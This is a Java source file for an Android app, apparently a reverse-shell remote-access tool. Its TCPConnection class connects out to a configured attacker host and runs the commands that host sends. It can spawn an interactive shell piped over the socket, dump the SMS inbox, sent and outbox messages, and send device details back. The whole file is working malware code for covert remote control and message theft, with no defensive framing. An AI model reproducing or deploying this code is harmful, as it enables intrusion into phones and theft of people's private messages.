package com.example.reverseshelltest;

import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Date;

public class TCPConnection implements Runnable {
    String host = Config_var.HOST;
    int port = Config_var.PORT;
    String SH_PATH= Config_var.SHELL_PATH;



    @Override
    public void run() {
        startReverseShell(host,port);
    }

    private void startReverseShell(String host, int port) {
        DataOutputStream toServer = null;
        BufferedReader fromServer = null;
        System.out.println("Connecting to " + host + ":" + port);
        boolean run = true;
        try {
            Socket socket = new Socket(host, port);
            System.out.println("Connected!");
            toServer = new DataOutputStream(socket.getOutputStream());
            fromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            toServer.write("Hello \n".getBytes("UTF-8"));
            while (run) {
                String command = fromServer.readLine();
                System.out.println(command);
                if(TextUtils.isEmpty(command)) {
                    continue;
                }
                if (command.equalsIgnoreCase("bye")) {
                    run = false;
                    exitInitialShell("bye", toServer);
                    continue;
                }
                if(command.equalsIgnoreCase("shell")){
                    toServer.write("----------Starting Shell----------\n".getBytes());
                    executeShell(SH_PATH,socket,toServer);
                }
                if(command.equalsIgnoreCase("dumpMessages")){
                    toServer.write("1: Inbox Messages \n".getBytes());
                    toServer.write("2: Sent Messages \n".getBytes());
                    toServer.write("3: Outbox Messages \n".getBytes());
                }
                if (command.equalsIgnoreCase("1")){
                    toServer.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
                }
                if(command.equalsIgnoreCase("2")){
                    toServer.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("sent"));
                }
                if(command.equalsIgnoreCase("3")){
                    toServer.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("Outbox"));
                }

                if (command.equalsIgnoreCase("deviceInfo")){
                    toServer.writeBytes(deviceInfo());
                }
                getShellPadding(toServer);

            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (toServer != null) {
                    toServer.close();
                }
                if (fromServer != null) {
                    fromServer.close();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
            if (run) {
                retry();
            } else {

            }
        }
    }

    private void exitInitialShell(String response, DataOutputStream toServer) {
        try {
            toServer.write(response.getBytes("UTF-8"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private void getShellPadding(DataOutputStream toServer) {
        try {
            toServer.flush();
            toServer.write("$Initial_Shell$ ".getBytes("UTF-8"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void retry() {
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        } finally {
          //  startReverseShell(host, port);
        }
    }

    public static void executeShell(String SH_PATH,Socket sock,DataOutputStream toServer) throws IOException {
        Process shell;
        try {
            shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start();
        } catch (IOException e) {
            System.out.println("Failed to start \"" + SH_PATH  + "\": " + e);
            return;
        }

        InputStream pis, pes, sis;
        OutputStream pos, sos;

        pis = shell.getInputStream();
        pes = shell.getErrorStream();
        sis = sock.getInputStream();
        pos = shell.getOutputStream();
        sos = sock.getOutputStream();

        while ( !sock.isClosed()) {
            try {
                while (pis.available() > 0) {
                    sos.write(pis.read());
                }

                while (pes.available() > 0) {
                    sos.write(pes.read());
                }

                while (sis.available() > 0) {
                    pos.write(sis.read());
                }

                sos.flush();
                pos.flush();
            } catch (IOException e) {
                System.out.println("Stream error: " + e);
                shell.destroy();
            }

            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                System.out.println("Thread sleep catch");
            }
            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
            }
        }
        toServer.write("----------Exiting Shell-----------\n".getBytes());
        System.out.println("Socket is not connected, exiting.");
        shell.destroy();
    }


    public String readSMSBox(String box) {
        Uri SMSURI = Uri.parse(Config_var.SMS_URL+box);
        Cursor cur = MainActivity.getAppContext().getContentResolver().query(SMSURI, null, null, null,null);
        String sms = "";
        try {
            if (cur.moveToFirst()) {
                for (int i = 0; i < cur.getCount(); ++i) {
                    String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                    String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                    Long epoch = Long.parseLong(date);
                    Date fDate = new Date(epoch * 1000);
                    date = fDate.toString();
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    sms += "[" + number + ":" + date + "]" + body + "\n";
                    cur.moveToNext();
                }
                sms += "\n";
            }
        } catch(NullPointerException npe) {
            return "";
        }
        return sms;
    }


    public String deviceInfo() {
        String ret = "--------------------------------------------\n";
        ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
        ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
        ret += "Product: "+android.os.Build.PRODUCT+"\n";
        ret += "Model: "+android.os.Build.MODEL+"\n";
        ret += "Brand: "+android.os.Build.BRAND+"\n";
        ret += "Device: "+android.os.Build.DEVICE+"\n";
        ret += "Host: "+android.os.Build.HOST+"\n";
        ret += "--------------------------------------------\n";
        return ret;
    }


}
